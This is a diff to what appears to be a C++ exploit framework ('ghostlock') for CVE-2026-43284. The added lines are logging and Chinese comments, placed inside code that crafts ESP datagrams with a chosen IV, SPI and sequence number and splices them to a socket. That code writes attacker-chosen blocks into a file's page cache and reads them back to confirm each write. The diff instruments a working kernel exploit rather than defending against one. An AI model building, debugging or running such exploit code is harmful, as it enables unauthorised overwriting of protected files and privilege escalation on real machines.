@@ -114,6 +114,11 @@ namespace ghostlock::backend::cve_2026_43284::landing {
                 hmac_key_[i] = sa.hmac_key[i];
             }
             next_seq_ = 1U;
+            /* 门开之后的事实（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/pagecache/pagecache.cpp:189-195
+             *  —— 那边 write16 用的就是 sa.spi / ctx.next_seq 与十六字节向量；next_seq 从 1 起）。
+             *  fd：file_fd 是载体的门（远端为 -1，此时页由 patch #1 写下的 helper 送进管道）。 */
+            GL_LOGI("window: doors open spi=0x%08x icv_len=%u next_seq=%u file_fd=%d socket_fd=%d",
+                    spi_, static_cast<unsigned>(icv_len_), next_seq_, doors_.file_fd(), doors_.socket_fd());
             return true;
         }
 
@@ -142,6 +147,21 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             std::uint8_t iv[kBlockBytes] = {};
             /* The block the caller wants is what the vector is derived against: see compute_iv. */
             splice_.compute_iv(old_block, block, aes_key_, iv);
+            /* 组帧的每段长度与头字段（成功历史：git show 6f7ded87:src/core/backend/cve_2026_43284/pagecache/pagecache.cpp:189-206
+             *  —— 那边 compute_cbc_iv 之后依次 store_be32(SPI)、store_be32(seq)、拼 IV，再算 ICV；
+             *  :243-251 一个报文 = header_iv + 页 + ICV；ICV 截断长度来自 sa.icv_len）。 */
+            GL_LOGI("frame: spi=0x%08x seq=%u icv_len=%u iv=%02x%02x%02x%02x old=%02x%02x%02x%02x want=%02x%02x%02x%02x",
+                    spi_, next_seq_, static_cast<unsigned>(icv_len_),
+                    static_cast<unsigned>(iv[0]), static_cast<unsigned>(iv[1]),
+                    static_cast<unsigned>(iv[2]), static_cast<unsigned>(iv[3]),
+                    static_cast<unsigned>(old_block[0]), static_cast<unsigned>(old_block[1]),
+                    static_cast<unsigned>(old_block[2]), static_cast<unsigned>(old_block[3]),
+                    static_cast<unsigned>(block[0]), static_cast<unsigned>(block[1]),
+                    static_cast<unsigned>(block[2]), static_cast<unsigned>(block[3]));
+            GL_LOGI("frame: segments hdr=%zu vector=%zu cipher=%zu icv=%zu total=%zu file_fd=%d socket=%d helper=%d",
+                    kHeaderBytes, kBlockBytes, kBlockBytes, static_cast<std::size_t>(icv_len_),
+                    kHeaderBytes + 2U * kBlockBytes + static_cast<std::size_t>(icv_len_),
+                    doors_.file_fd(), doors_.socket_fd(), doors_.file_fd() < 0 ? 1 : 0);
             /* The datagram has the shape the old tree documents, and the length follows from it:
              *  spi(4) | sequence(4) | vector(16) | ciphertext(16) | check(icv_len). The block read
              *  above is the ciphertext already. Everything is assembled before any of it is checked
@@ -172,11 +192,17 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             if (!splice_.splice_one(doors_.socket_fd(), datagram.data(), prefix + icv_len_, position)) {
                 GL_LOGI("window: splice NOT sent offset=%llu err=%d seq=%u (20=hdr 21=page 22=len 23=suffix)",
                         static_cast<unsigned long long>(position), splice_.last_error(), next_seq_);
+                GL_LOGI("frame not sent: next_seq stays=%u file_fd=%d", next_seq_, doors_.file_fd());
                 outcome_ = WriteOutcome::NotSent;
                 return false;
             }
             /* Advanced only after the send succeeded, which is the old order. */
             next_seq_ += 1U;
+            /* 发送字节数与序号的前后值（成功历史：pagecache.cpp:243-261
+             *  —— 那边 total = header_iv + 页 + icv_len 交给 splice；只有 sent == total 才 next_seq += 1）。 */
+            GL_LOGI("frame sent: offset=%llu bytes=%zu seq_used=%u next_seq=%u socket=%d file_fd=%d",
+                    static_cast<unsigned long long>(position), prefix + static_cast<std::size_t>(icv_len_),
+                    next_seq_ - 1U, next_seq_, doors_.socket_fd(), doors_.file_fd());
             outcome_ = WriteOutcome::Wrote;
             return true;
         }
@@ -217,12 +243,19 @@ namespace ghostlock::backend::cve_2026_43284::landing {
             }
             if (splice_.read_at(doors_.file_fd(), block, kBlockBytes, position) !=
                 static_cast<long>(kBlockBytes)) {
+                GL_LOGI("read_block: incomplete fd=%d pos=%llu len=%zu",
+                        doors_.file_fd(), static_cast<unsigned long long>(position), kBlockBytes);
                 read_outcome_ = ReadOutcome::Incomplete;
                 return false;
             }
             for (std::size_t i = 0U; i < kBlockBytes; ++i) {
                 out[i] = block[i];
             }
+            /* 回读的结果（成功历史：pagecache.cpp:116-166 的 read_block —— 只有整块读回才算成）。 */
+            GL_LOGI("read_block: ok fd=%d pos=%llu len=%zu head=%02x%02x%02x%02x",
+                    doors_.file_fd(), static_cast<unsigned long long>(position), kBlockBytes,
+                    static_cast<unsigned>(block[0]), static_cast<unsigned>(block[1]),
+                    static_cast<unsigned>(block[2]), static_cast<unsigned>(block[3]));
             read_outcome_ = ReadOutcome::Read;
             return true;
         }
@@ -235,6 +268,9 @@ namespace ghostlock::backend::cve_2026_43284::landing {
          *  carrier's write landed nowhere. The retired tree carried the value between its contexts
          *  for the same reason. */
         void adopt_sequence(std::uint32_t next) noexcept override {
+            /* 序号的前后值（成功历史：pagecache.cpp:192 store_be32(header_iv + kEspSeqOffset, ctx.next_seq)
+             *  —— 同一个 SA 上的后续窗口必须接着前一个的序号，续接发生在写之前）。 */
+            GL_LOGI("window: adopt_sequence from=%u to=%u", next_seq_, next == 0U ? 1U : next);
             next_seq_ = next == 0U ? 1U : next;
         }
 
